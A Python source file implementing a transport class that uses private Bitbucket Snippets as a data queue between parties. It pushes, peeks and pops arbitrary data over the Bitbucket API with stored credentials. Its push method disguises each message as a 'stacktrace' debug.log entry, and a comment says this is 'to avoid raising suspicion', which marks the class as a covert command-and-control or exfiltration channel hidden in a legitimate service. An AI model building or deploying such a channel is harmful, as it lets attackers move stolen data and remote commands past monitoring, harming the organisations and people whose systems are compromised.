import datetime
import requests
import json

import functools


class BitbucketTransport():
    """Send and recieve arbitrary data to a queue implemented in Bitbucket Snippets.
        https://confluence.atlassian.com/bitbucket/snippets-719095082.html
    """

    TITLE_TEMPLATE = "stacktrace|{time}"
    SNIPPET_FILE_NAME = "debug.log"

    def __init__(self):
        with open("auth.json") as f:
            auth = json.load(f)
            self.email = auth["email"]
            self.password = auth["password"]
            self.username = auth["username"]

        self.BASE_URL = "https://api.bitbucket.org/"
        self.auth = (self.email, self.password)
        self.history = []

    def push(self, data):
        """Add something to the end of the queue

        Snippets looks like this:
            push() -> [4, 3, 2, 1, 0 ...] -> pop()
        The numbers indicate in which order items were added to the queue.
        0 was added first, 4 last.
        """

        self.history.append({
            "history_type": "push",
            "data": data
        })

        # Imitate a stack trace to avoid rasing suspicion.
        metadata = {
            "title": self.TITLE_TEMPLATE.format(
                time=datetime.datetime.utcnow().strftime('%b-%d-%I%M%p-%G')),
            "is_private": True,
        }

        # Send the file as a POST request of raw text, not an actual HTTP multipart file.
        files = {
            "file": (self.SNIPPET_FILE_NAME, data)
        }

        res = self._api_post(data=metadata, files=files)

        return res

    def pop(self):
        """Remove and return the oldest item in the queue.

        Snippets looks like this:
            push() -> [4, 3, 2, 1, 0 ...] -> pop()
        The numbers indicate in which order items were added to the queue.
        0 was added first, 4 last.
        """
        snips = self.get_all_snippets()
        if not snips:
            return None

        # Get the oldest snippet
        snip = snips[0]

        # Delete it
        snip_content = self.get_content(snip)
        self.delete_snip(snip["id"])
        self.history.append({
            "history_type": "pop",
            "data": snip_content
        })
        return snip_content

    def peek(self):
        """Return the oldest item in the queue.

        Snippets looks like this:
            push() -> [4, 3, 2, 1, 0 ...] -> pop()
        The numbers indicate in which order items were added to the queue.
        0 was added first, 4 last.
        """
        snips = self.get_all_snippets()
        if not snips:
            return None

        # Get the oldest snippet
        snip = snips[0]
        snip_content = self.get_content(snip)
        self.history.append({
            "history_type": "peek",
            "data": snip_content
        })
        return snip_content

    def search_filter(self, filter_, pop=False):
        """Find the first snippet that matches the provided filter.
        Args:
            filter_: Function that returns True for the snippets we want to match.
        Returns:
            The first matching snippet (as a string).
        """

        snips = self.get_all_snippets()
        if not snips:
            return None

        # Walk the front of the queue until we find the oldest item meant for us.
        for snip in snips:
            snip_content = self.get_content(snip)
            if filter_(snip_content):
                # We can only pop if we found something.
                if pop:
                    self.delete_snip(snip["id"])
                return snip_content

        return None

    def pop_filter(self, filter_):
        return self.search_filter(filter_=filter_, pop=True)

    def peek_filter(self, filter_):
        return self.search_filter(filter_=filter_, pop=False)

    def delete_snip(self, snip_id):
        delete_url = "https://bitbucket.org/api/2.0/snippets/" + \
            self.username + "/" + snip_id
        requests.delete(delete_url, auth=self.auth)

    def get_content(self, snip):
        """Returns the raw text in a snippet object.
        Args:
            snip: Dict of snippet metadata from the Bitbucket snippets API
        Returns:
            str: The raw snippet text.
        """

        url = "/".join(snip["links"]["diff"]["href"].split("/")[:-1])
        res = self._get_snip_content(url)
        if res.status_code == 404:
            # The snippet might have been deleted since we got its id, so we can ignore this.
            return res.text
        res.raise_for_status()
        return res.text

    @functools.lru_cache(maxsize=5)
    def _get_snip_content(self, url):
        """Split out the network request part so we can cache it."""
        res = requests.get(url + "/files/{filename}".format(filename=self.SNIPPET_FILE_NAME),
                           auth=self.auth)
        return res

    def _api_get(self, *args, **kwargs):
        return requests.get(self.BASE_URL + "/2.0/snippets?role=owner",
                            auth=(self.email, self.password),
                            *args, **kwargs)

    def _api_post(self, *args, **kwargs):
        return requests.post(self.BASE_URL + "/2.0/snippets",
                             auth=(self.email, self.password),
                             *args, **kwargs)

    def get_all_snippets(self):
        """Return all snippets in this Bitbucket account."""
        res = self._api_get()
        res.raise_for_status()
        res = res.json()

        # No pagination
        if "next" not in res:
            return res["values"]

        snippets = []
        while True:
            # Extract the current list of snippets
            for snip in res["values"]:
                snippets.append(snip)

            if "next" in res:
                # Get the next page
                res = requests.get(res["next"], auth=self.auth)
                res.raise_for_status()
                res = res.json()
            else:
                return snippets
